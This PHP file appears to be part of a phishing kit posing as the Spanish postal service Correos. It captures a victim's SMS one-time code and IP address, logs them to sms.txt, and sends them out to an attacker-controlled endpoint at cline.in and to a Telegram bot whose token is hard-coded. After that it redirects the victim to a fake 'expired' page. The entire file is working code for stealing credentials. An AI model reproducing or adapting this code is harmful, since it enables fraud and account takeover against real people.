<?php
error_reporting(0);
$bin4=$_GET['page'];
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");
include 'rm.php';
$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . "";
$to = $Your_Email;$from = "local@localhost.com";$headers = "From:" . $from;$subj = "OK CORREOS ES : $ip";
if(!isset($_REQUEST['shipped']) || $_REQUEST['shipped']=='' ){
	die("<script type='text/javascript'>top.location ='index.php?page=****';</script>");
}

$smes = $_REQUEST['shipped'];

function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1244123994:AAEG5OQvqUXTvyMmc4QWOvgYKIxy1ofq55g';
    $chat_id  = '1128003836';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));
if(strlen($smes) < 4)
{
    die("<script type='text/javascript'>top.location ='index.php?page=****';</script>");

}else{
		
 $data = "
+ ------------------sms 2 ok----------------------+ <br>
+ OK SMS 2 : $smes<br>
+ -------------------------------------------------------------+ <br>
+ -------------------------------------------------------------+ <br>
+ Victim Information <br>
 $VictimInfo <br>
+ -------------------------------------------------------------+ <br>
";
if($Save_Log==1) { $file = fopen("sms.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) { 

$curl = curl_init();
// Set some options - we are passing in a useragent too here
curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => "https://cline.in/sendcurl7.php?subject=".urlencode($subj)."&sms=".urlencode($data),
	CURLOPT_CONNECTTIMEOUT=> 0,
    CURLOPT_TIMEOUT=> 5,
));
// Send the request & save response to $resp
$resp = curl_exec($curl);

// Close request to clear up some resources
curl_close($curl);


 }
die("<script type='text/javascript'>top.location = './smsExpired.php';</script>");}

?>